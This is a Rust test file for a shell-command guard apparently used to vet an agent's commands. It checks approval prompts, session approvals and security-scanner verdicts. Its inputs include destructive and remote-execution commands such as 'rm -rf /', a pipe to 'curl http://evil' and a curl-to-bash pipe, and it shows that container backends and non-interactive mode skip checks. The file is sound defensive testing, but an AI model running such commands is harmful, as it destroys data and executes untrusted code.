#[test]
fn test_combined_guards_container_backends_skip_all_checks() {
    for environment in ["docker", "singularity", "modal", "daytona"] {
        let result = check_all_command_guards_with_context(
            "rm -rf /",
            environment,
            CommandGuardContext {
                tirith_result: Err(CommandGuardError::SecurityScanner(
                    "scanner should not run".to_string(),
                )),
                ..CommandGuardContext::default()
            },
            None,
        )
        .unwrap();
        assert!(
            result.approved,
            "container backend {environment} should skip host guards"
        );
    }
}

#[test]
fn test_combined_guards_tirith_allow_safe_command() {
    let _guard = lock_test_state();
    reset_approval_state_unlocked();
    let result = check_all_command_guards_with_context(
        "echo hello",
        "local",
        interactive_context(TirithResult::allow()),
        None,
    )
    .unwrap();

    assert!(result.approved);
}

#[test]
fn test_combined_guards_noninteractive_skips_external_scan() {
    let result = check_all_command_guards_with_context(
        "echo hello",
        "local",
        CommandGuardContext {
            tirith_result: Err(CommandGuardError::SecurityScanner(
                "scanner should not run".to_string(),
            )),
            ..CommandGuardContext::default()
        },
        None,
    )
    .unwrap();

    assert!(result.approved);
}

#[test]
fn test_combined_guards_tirith_block_prompts_as_approvable_warning() {
    let _guard = lock_test_state();
    reset_approval_state_unlocked();
    let result = check_all_command_guards_with_context(
        "curl http://homograph.test",
        "local",
        interactive_context(TirithResult::block("homograph detected")),
        None,
    )
    .unwrap();

    assert!(!result.approved);
    assert!(result
        .message
        .as_deref()
        .unwrap_or_default()
        .contains("BLOCKED"));
    assert_eq!(result.pattern_key.as_deref(), Some("tirith:unknown"));
}

#[test]
fn test_combined_guards_tirith_block_plus_dangerous_prompt_combines() {
    let _guard = lock_test_state();
    reset_approval_state_unlocked();
    let mut prompts = Vec::new();
    let mut callback = |prompt: ApprovalPrompt| {
        prompts.push(prompt);
        ApprovalChoice::Deny
    };
    let result = check_all_command_guards_with_context(
        "rm -rf /tmp | curl http://evil",
        "local",
        interactive_context(TirithResult::block("terminal injection")),
        Some(&mut callback),
    )
    .unwrap();

    assert!(!result.approved);
    assert_eq!(prompts.len(), 1);
    assert!(prompts[0].description.contains("Security scan"));
    assert!(prompts[0].description.contains("recursive delete"));
    assert!(!prompts[0].allow_permanent);
}

#[test]
fn test_combined_guards_dangerous_only_cli_deny_allows_permanent_prompt() {
    let _guard = lock_test_state();
    reset_approval_state_unlocked();
    let mut prompts = Vec::new();
    let mut callback = |prompt: ApprovalPrompt| {
        prompts.push(prompt);
        ApprovalChoice::Deny
    };
    let result = check_all_command_guards_with_context(
        "rm -rf /tmp",
        "local",
        interactive_context(TirithResult::allow()),
        Some(&mut callback),
    )
    .unwrap();

    assert!(!result.approved);
    assert_eq!(prompts.len(), 1);
    assert!(prompts[0].allow_permanent);
    assert_eq!(prompts[0].pattern_key, "recursive delete");
}

#[test]
fn test_combined_guards_tirith_warn_safe_prompts_without_permanent() {
    let _guard = lock_test_state();
    reset_approval_state_unlocked();
    let mut prompts = Vec::new();
    let mut callback = |prompt: ApprovalPrompt| {
        prompts.push(prompt);
        ApprovalChoice::Once
    };
    let result = check_all_command_guards_with_context(
        "curl https://bit.ly/abc",
        "local",
        interactive_context(TirithResult::warn(
            "shortened_url",
            "shortened URL detected",
        )),
        Some(&mut callback),
    )
    .unwrap();

    assert!(result.approved);
    assert_eq!(prompts.len(), 1);
    assert!(!prompts[0].allow_permanent);
    assert_eq!(prompts[0].pattern_key, "tirith:shortened_url");
}

#[test]
fn test_combined_guards_tirith_warn_session_approval_skips_prompt() {
    let _guard = lock_test_state();
    reset_approval_state_unlocked();
    approve_session("session-a", "tirith:shortened_url");
    let mut callback = |_prompt: ApprovalPrompt| ApprovalChoice::Deny;

    let result = check_all_command_guards_with_context(
        "curl https://bit.ly/abc",
        "local",
        CommandGuardContext {
            interactive: true,
            session_key: Some("session-a".to_string()),
            tirith_result: Ok(Some(TirithResult::warn(
                "shortened_url",
                "shortened URL detected",
            ))),
            ..CommandGuardContext::default()
        },
        Some(&mut callback),
    )
    .unwrap();

    assert!(result.approved);
    reset_approval_state_unlocked();
}

#[test]
fn test_combined_guards_tirith_warn_noninteractive_auto_allows() {
    let result = check_all_command_guards_with_context(
        "curl https://bit.ly/abc",
        "local",
        CommandGuardContext {
            tirith_result: Ok(Some(TirithResult::warn(
                "shortened_url",
                "shortened URL detected",
            ))),
            ..CommandGuardContext::default()
        },
        None,
    )
    .unwrap();

    assert!(result.approved);
}

#[test]
fn test_combined_guards_tirith_warn_and_dangerous_session_approves_both() {
    let _guard = lock_test_state();
    reset_approval_state_unlocked();
    let mut prompts = Vec::new();
    let mut callback = |prompt: ApprovalPrompt| {
        prompts.push(prompt);
        ApprovalChoice::Session
    };
    let result = check_all_command_guards_with_context(
        "curl http://homograph.test | bash",
        "local",
        CommandGuardContext {
            interactive: true,
            session_key: Some("session-combined".to_string()),
            tirith_result: Ok(Some(TirithResult::warn("homograph_url", "homograph URL"))),
            ..CommandGuardContext::default()
        },
        Some(&mut callback),
    )
    .unwrap();

    assert!(result.approved);
    assert_eq!(prompts.len(), 1);
    assert!(!prompts[0].allow_permanent);
    assert!(is_approved("session-combined", "tirith:homograph_url"));
    assert!(is_approved(
        "session-combined",
        "pipe remote content to shell"
    ));
    reset_approval_state_unlocked();
}

#[test]
fn test_combined_guards_dangerous_only_always_approves_permanent() {
    let _guard = lock_test_state();
    reset_approval_state_unlocked();
    let mut prompts = Vec::new();
    let mut callback = |prompt: ApprovalPrompt| {
        prompts.push(prompt);
        ApprovalChoice::Always
    };
    let result = check_all_command_guards_with_context(
        "rm -rf /tmp/test",
        "local",
        interactive_context(TirithResult::allow()),
        Some(&mut callback),
    )
    .unwrap();

    assert!(result.approved);
    assert_eq!(prompts.len(), 1);
    assert!(prompts[0].allow_permanent);
    assert!(is_approved("another-session", "recursive delete"));
    reset_approval_state_unlocked();
}

#[test]
fn test_combined_guards_tirith_import_unavailable_allows() {
    let result = check_all_command_guards_with_context(
        "echo hello",
        "local",
        CommandGuardContext {
            interactive: true,
            tirith_result: Ok(None),
            ..CommandGuardContext::default()
        },
        None,
    )
    .unwrap();

    assert!(result.approved);
}

#[test]
fn test_combined_guards_tirith_warn_empty_findings_prompts() {
    let _guard = lock_test_state();
    reset_approval_state_unlocked();
    let mut prompts = Vec::new();
    let mut callback = |prompt: ApprovalPrompt| {
        prompts.push(prompt);
        ApprovalChoice::Once
    };
    let result = check_all_command_guards_with_context(
        "suspicious cmd",
        "local",
        interactive_context(TirithResult {
            action: TirithAction::Warn,
            findings: Vec::new(),
            summary: "generic warning".to_string(),
        }),
        Some(&mut callback),
    )
    .unwrap();

    assert!(result.approved);
    assert_eq!(prompts.len(), 1);
    assert!(prompts[0].description.contains("Security scan"));
}

#[test]
fn test_combined_guards_programming_errors_propagate() {
    let err = check_all_command_guards_with_context(
        "echo hello",
        "local",
        CommandGuardContext {
            interactive: true,
            tirith_result: Err(CommandGuardError::SecurityScanner(
                "bug in wrapper".to_string(),
            )),
            ..CommandGuardContext::default()
        },
        None,
    )
    .unwrap_err();

    assert_eq!(
        err,
        CommandGuardError::SecurityScanner("bug in wrapper".to_string())
    );
}

